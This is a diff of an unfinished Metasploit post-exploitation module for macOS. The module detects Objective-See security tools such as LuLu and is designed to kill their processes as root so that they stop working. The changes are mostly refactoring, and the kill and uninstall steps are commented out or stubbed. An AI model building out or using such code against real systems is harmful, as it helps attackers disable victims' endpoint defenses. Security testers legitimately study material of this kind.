@@ -25,7 +25,7 @@ class MetasploitModule < Msf::Post
         'Platform' => [ 'osx' ],
         'URL' => [
           'https://objective-see.org/tools.html'
-        ],
+        ]
       )
 
   )
@@ -38,17 +38,21 @@ class MetasploitModule < Msf::Post
   end
 
   # Holds information on an objective see product. i.e name, installation status and location on filesystem.
-  class ObjectiveSee < Msf::Modules::Post__Osx__Manage__Objective_see_killer
+  class ObjectiveSee
 
-    attr_accessor :name
-    attr_accessor :path
+    attr_accessor :name, :path
 
+    # is cattr_accessor only in rails?
     cattr_accessor :installed_products
     cattr_accessor :pids
 
     @@installed_products = []
 
-    def initialize(name)
+    def initialize(name, msf)
+
+      # so we can use the Metasploit API to interact with the session object
+      @msf = msf
+
       @name = name
       @path = "/Applications/#{name}"
       @installed = installed?
@@ -58,16 +62,13 @@ class MetasploitModule < Msf::Post
       @@installed_products << self if installed?
     end
 
-    # Arrays of products present on system & pid's of running processes
-    %w[installed_products all_pids].each { |var| eval("@@#{var} = []", binding, __FILE__, __LINE__) }
-
     def installed?
-      @installed = directory?(@path)
+      @installed = @msf.send :directory?, @path
     end
 
     def pid
       # may return more than one pid need to test
-      @pid = pidof @name
+      @pid = @msf.send :pidof, @name
       print_status "DEBUG @pid = #{@pid.inspect} for @name = #{@name}"
     end
 
@@ -78,28 +79,29 @@ class MetasploitModule < Msf::Post
 
   # determine which products are installed and their ppid if any
   def enumerate
-    #products = ['LuLu.app', 'BlockBlock Helper.app', 'Do Not Disturb.app',
+    # products = ['LuLu.app', 'BlockBlock Helper.app', 'Do Not Disturb.app',
     # 'ReiKey.app', 'RansomWhere.app', 'OverSight.app'].map do |prod|
     #  ObjectiveSee.new prod
-   # end
+    # end
 
-   ObjectiveSee.new 'LuLu.app'
+    print_status "DEBUG: self is #{self} class: #{self.class}"
+    ObjectiveSee.new 'LuLu.app', self
 
     # we only want the products installed on the system
-   # products = products.filter_map(&:installed?)
-   # products.each { |prod| print_status "#{prod.name} is installed." }
+    # products = products.filter_map(&:installed?)
+    # products.each { |prod| print_status "#{prod.name} is installed." }
 
     # determine which products are running.
-   # products.filter_map(&:running?)
+    # products.filter_map(&:running?)
   end
 
   def kill_pid(pid)
     if !is_root?
-      fail_with(Failure::NoAcces, 'Can not disable products unless running as root. 
+      fail_with(Failure::NoAcces, 'Can not disable products unless running as root.
       Please escelate privlleges before re-running the module.')
-    end 
- 
-    kill_process pid 
+    end
+
+    kill_process pid
   end
 
   def uninstall; end
@@ -110,13 +112,13 @@ class MetasploitModule < Msf::Post
 
     if ObjectiveSee.installed_products.empty?
       fail_with(Failure::NotFound,
-       "No Objective Cee products were found to be installed on the system.")
+                'No Objective Cee products were found to be installed on the system.')
     else
-      print_good("The following Objective See products were found installed on the system.")
-      ObjectiveSee.installed_products.each {|prod| print_status(prod.name)}
-    end 
+      print_good('The following Objective See products were found installed on the system.')
+      ObjectiveSee.installed_products.each { |prod| print_status(prod.name) }
+    end
 
-   # ObjectiveSee.installed_products.each {|prod| &:kill_pid} if datastore['KILL_PROCESSES']
+    # ObjectiveSee.installed_products.each {|prod| &:kill_pid} if datastore['KILL_PROCESSES']
 
     # uninstall if datastore['']
   end
